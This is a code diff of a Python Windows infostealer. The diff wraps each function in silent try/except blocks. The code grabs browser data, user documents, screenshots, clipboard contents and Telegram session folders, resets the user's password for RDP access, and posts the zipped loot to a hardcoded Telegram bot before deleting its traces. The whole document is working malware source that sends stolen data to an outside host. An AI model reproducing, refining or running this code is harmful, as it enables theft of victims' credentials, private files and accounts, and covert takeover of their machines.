@@ -34,23 +34,25 @@ browsers = {
 
 
 def makdirs():
-    os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\chrome"), exist_ok=True)
-    os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\amigo"), exist_ok=True)
-    os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\microsoft-edge"), exist_ok=True)
-    os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\torch"), exist_ok=True)
-    os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\kometa"), exist_ok=True)
-    os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\orbitum"), exist_ok=True)
-    os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\cent-browser"), exist_ok=True)
-    os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\7star"), exist_ok=True)
-    os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\sputnik"), exist_ok=True)
-    os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\vivaldi"), exist_ok=True)
-    os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\chrome-sxs"), exist_ok=True)
-    os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\epic-privacy-browser"), exist_ok=True)
-    os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\uran"), exist_ok=True)
-    os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\yandex"), exist_ok=True)
-    os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\brave"), exist_ok=True)
-    os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\iridium"), exist_ok=True)
-
+    try:
+        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\chrome"), exist_ok=True)
+        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\amigo"), exist_ok=True)
+        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\microsoft-edge"), exist_ok=True)
+        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\torch"), exist_ok=True)
+        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\kometa"), exist_ok=True)
+        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\orbitum"), exist_ok=True)
+        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\cent-browser"), exist_ok=True)
+        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\7star"), exist_ok=True)
+        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\sputnik"), exist_ok=True)
+        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\vivaldi"), exist_ok=True)
+        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\chrome-sxs"), exist_ok=True)
+        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\epic-privacy-browser"), exist_ok=True)
+        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\uran"), exist_ok=True)
+        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\yandex"), exist_ok=True)
+        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\brave"), exist_ok=True)
+        os.makedirs(os.path.dirname("C:\\win_ord\\Browsers\\iridium"), exist_ok=True)
+    except:
+        pass
 
 # def get_files():
 #     source_path = os.path.expanduser("~") + "\\"
@@ -81,39 +83,48 @@ def makdirs():
 #                     shutil.copy2(source_file_path, destination_file_path)
 
 def get_files():
-    max_size = 2 * 1024 * 1024
-    directories = {'Desktop': 'desktop', 'Documents': 'documents', 'Downloads': 'downloads', 'Videos': 'videos'}
-    permissions = 0o777
-    destination = "C:\\win_ord\\grabber"
-    for source_dir, dest_subdir in directories.items():
-        for root, dirs, files in os.walk(os.path.expanduser(f'~/{source_dir}')):
-            for file in files:
-                file_path = os.path.join(root, file)
-                if os.path.getsize(file_path) <= max_size:
-                    dest_dir = os.path.join(destination, dest_subdir, os.path.relpath(root, os.path.expanduser(f'~/{source_dir}')))
-                    os.makedirs(dest_dir, exist_ok=True)
-                    os.chmod(dest_dir, permissions)
-                    shutil.copy(file_path, dest_dir)
+    try:
+        max_size = 2 * 1024 * 1024
+        directories = {'Desktop': 'desktop', 'Documents': 'documents', 'Downloads': 'downloads', 'Videos': 'videos'}
+        permissions = 0o777
+        destination = "C:\\win_ord\\grabber"
+        for source_dir, dest_subdir in directories.items():
+            for root, dirs, files in os.walk(os.path.expanduser(f'~/{source_dir}')):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    if os.path.getsize(file_path) <= max_size:
+                        dest_dir = os.path.join(destination, dest_subdir, os.path.relpath(root, os.path.expanduser(f'~/{source_dir}')))
+                        os.makedirs(dest_dir, exist_ok=True)
+                        os.chmod(dest_dir, permissions)
+                        shutil.copy2(file_path, dest_dir, permissions)
+    except:
+        pass
 
 
 
 def get_screenshot():
-    destination_path = "C:\\win_ord\\screenshots\\webcam.png"
-    os.makedirs(os.path.dirname(destination_path), exist_ok=True)
-    permissions = 0o777
-    os.chmod(destination_path.replace("\\webcam.png",""), permissions)
-    screenshot = ImageGrab.grab()
-    screenshot.save(destination_path)
+    try:
+        destination_path = "C:\\win_ord\\screenshots\\webcam.png"
+        os.makedirs(os.path.dirname(destination_path), exist_ok=True)
+        permissions = 0o777
+        os.chmod(destination_path.replace("\\webcam.png",""), permissions)
+        screenshot = ImageGrab.grab()
+        screenshot.save(destination_path)
+    except:
+        pass
 
 
 def get_clipb_data() -> str:
-    destination_path = "C:\\win_ord\\clipboard_data\\clip_board.txt"
-    os.makedirs(os.path.dirname(destination_path), exist_ok=True)
-    permissions = 0o777
-    os.chmod(destination_path.replace("\\clip_board.txt",""), permissions)
-    clip = subprocess.run("powershell Get-Clipboard", shell= True, capture_output= True).stdout.decode(errors= 'backslashreplace').strip()
-    with open(destination_path,"a") as save:
-        save.write(clip+"\n")
+    try:
+        destination_path = "C:\\win_ord\\clipboard_data\\clip_board.txt"
+        os.makedirs(os.path.dirname(destination_path), exist_ok=True)
+        permissions = 0o777
+        os.chmod(destination_path.replace("\\clip_board.txt",""), permissions)
+        clip = subprocess.run("powershell Get-Clipboard", shell= True, capture_output= True).stdout.decode(errors= 'backslashreplace').strip()
+        with open(destination_path,"a") as save:
+            save.write(clip+"\n")
+    except:
+        pass
 
 
 def get_systeminfo():
@@ -219,29 +230,32 @@ def get_systeminfo():
 
 
 def get_telegram():
-    path1 = 'D:\\Telegram Desktop\\tdata'
-    path2 = os.environ['USERPROFILE'] + "\\AppData\\Roaming\\Telegram Desktop\\tdata"
-    path3 = 'C:\\Program Files\\Telegram Desktop\\tdata'
-    destination_path = "C:\\win_ord\\social\\telegram"
-    os.makedirs(os.path.dirname(destination_path), exist_ok=True)
-    permissions = 0o777
-    os.chmod(destination_path, permissions)
     try:
-        shutil.copytree(path1,
-                destination_path,
-                ignore = shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))
-    except:
-        pass
-    try:
-        shutil.copytree(path2,
-                destination_path,
-                ignore = shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))
-    except:
-        pass
-    try:
-        shutil.copytree(path3,
-                destination_path,
-                ignore = shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))
+        path1 = 'D:\\Telegram Desktop\\tdata'
+        path2 = os.environ['USERPROFILE'] + "\\AppData\\Roaming\\Telegram Desktop\\tdata"
+        path3 = 'C:\\Program Files\\Telegram Desktop\\tdata'
+        destination_path = "C:\\win_ord\\social\\telegram"
+        os.makedirs(os.path.dirname(destination_path), exist_ok=True)
+        permissions = 0o777
+        os.chmod(destination_path, permissions)
+        try:
+            shutil.copytree(path1,
+                    destination_path,
+                    ignore = shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))
+        except:
+            pass
+        try:
+            shutil.copytree(path2,
+                    destination_path,
+                    ignore = shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))
+        except:
+            pass
+        try:
+            shutil.copytree(path3,
+                    destination_path,
+                    ignore = shutil.ignore_patterns("dumps", "emoji", "tdummy", "user_data", "user_data#2", "user_data#3"))
+        except:
+            pass
     except:
         pass
 
@@ -466,27 +480,30 @@ def is_admin():
 
 
 def get_rdp():
-    destination_path = "C:\\win_ord\\rdp_info\\"+f"{os.getlogin()}_rdp.txt"
-    os.makedirs(os.path.dirname(destination_path), exist_ok=True)
-    permissions = 0o777
-    os.chmod(destination_path, permissions)
-    passs = "RDPPASSWORD"
-    pub_ip = requests.get('https://api.ipify.org').text
-    host = socket.gethostname()
-    priv_ip = socket.gethostbyname(host)
-    total_ram = psutil.virtual_memory().total
-    ram = ("{:.2f} GB".format(total_ram / (1024**3)))
-    system_info = platform.uname()
-    system = system_info.system
-    node = system_info.node
-    release = system_info.release
-    version = system_info.version
-    machine = system_info.machine
-    processor = system_info.processor
-    subprocess.check_output(f"net user {os.getlogin()} {passs}",shell=True)
-    build = f"========================= [Unknown-Society] ============================Username : {os.getlogin()}\nPublic Ip : {pub_ip}\nPrivate Ip : {priv_ip}\nPassword : {passs}\nRam : {ram}\nSystem : {system}\nNode : {node}\nrelease : {release}\nversion : {version}\nmachine : {machine}\nprocessor : {processor}\n========================= [Unknown-Society] ============================"
-    with open("rdp_grb.txt","a") as f:
-        f.write(build)
+    try:
+        destination_path = "C:\\win_ord\\rdp_info\\"+f"{os.getlogin()}_rdp.txt"
+        os.makedirs(os.path.dirname(destination_path), exist_ok=True)
+        permissions = 0o777
+        os.chmod(destination_path, permissions)
+        passs = "RDPPASSWORD"
+        pub_ip = requests.get('https://api.ipify.org').text
+        host = socket.gethostname()
+        priv_ip = socket.gethostbyname(host)
+        total_ram = psutil.virtual_memory().total
+        ram = ("{:.2f} GB".format(total_ram / (1024**3)))
+        system_info = platform.uname()
+        system = system_info.system
+        node = system_info.node
+        release = system_info.release
+        version = system_info.version
+        machine = system_info.machine
+        processor = system_info.processor
+        subprocess.check_output(f"net user {os.getlogin()} {passs}",shell=True)
+        build = f"========================= [Unknown-Society] ============================Username : {os.getlogin()}\nPublic Ip : {pub_ip}\nPrivate Ip : {priv_ip}\nPassword : {passs}\nRam : {ram}\nSystem : {system}\nNode : {node}\nrelease : {release}\nversion : {version}\nmachine : {machine}\nprocessor : {processor}\n========================= [Unknown-Society] ============================"
+        with open("rdp_grb.txt","a") as f:
+            f.write(build)
+    except:
+        pass
 	
 
 def generate_random_string(n):
@@ -494,38 +511,43 @@ def generate_random_string(n):
 
 
 def zip_and_send_out():
-    chat_id =  "-1001968210560"
-    token = "6117801998:AAHE-TBVbiURBxqpKr_JqLLs5optKu3PC7o"
-    random_string = generate_random_string(15)
-    zip_name = f"{random_string}.zip"
-    folder_path = "C:\\win_ord"
-    
-    dest_path = "C:\\windll"
-    os.chmod(folder_path, 0o777)
-    zip_path = os.path.join(dest_path, zip_name)
-    os.makedirs(os.path.dirname("C:\\windll\\"+zip_name), exist_ok=True)
-    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
-        for root, dirs, files in os.walk(folder_path):
-            for file in files:
-                file_path = os.path.join(root, file)
-                zip_file.write(file_path, os.path.relpath(file_path, folder_path))
-    with open(zip_path, 'rb') as zip_file:
-        url = f'https://api.telegram.org/bot{token}/sendDocument'
-        msg = f"New LOGS INCOMING"
-        files = {'document': zip_file}
-        data = {'chat_id': chat_id, 'caption': f'{msg}'}
-        response = requests.post(url, files=files, data=data)
-    os.remove(zip_path)
-    shutil.rmtree(r"C:\\win_ord")
-    shutil.rmtree(r"C:\\windll")
+    try:
+        chat_id =  "-1001968210560"
+        token = "6117801998:AAHE-TBVbiURBxqpKr_JqLLs5optKu3PC7o"
+        random_string = generate_random_string(15)
+        zip_name = f"{random_string}.zip"
+        folder_path = "C:\\win_ord"
+        
+        dest_path = "C:\\windll"
+        os.chmod(folder_path, 0o777)
+        zip_path = os.path.join(dest_path, zip_name)
+        os.makedirs(os.path.dirname("C:\\windll\\"+zip_name), exist_ok=True)
+        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zip_file:
+            for root, dirs, files in os.walk(folder_path):
+                for file in files:
+                    file_path = os.path.join(root, file)
+                    zip_file.write(file_path, os.path.relpath(file_path, folder_path))
+        with open(zip_path, 'rb') as zip_file:
+            url = f'https://api.telegram.org/bot{token}/sendDocument'
+            msg = f"New LOGS INCOMING"
+            files = {'document': zip_file}
+            data = {'chat_id': chat_id, 'caption': f'{msg}'}
+            response = requests.post(url, files=files, data=data)
+        os.remove(zip_path)
+        shutil.rmtree(r"C:\\win_ord")
+        shutil.rmtree(r"C:\\windll")
+    except:
+        pass
 
 
 def main():
-    if __name__ == "__main__":
-        get_browsers_details()
-        get_clipb_data()
-        get_files()
-        get_screenshot()
-        zip_and_send_out()
-    
+    try:
+        if __name__ == "__main__":
+            get_browsers_details()
+            get_clipb_data()
+            get_files()
+            get_screenshot()
+            zip_and_send_out()
+    except:
+        pass
 main()
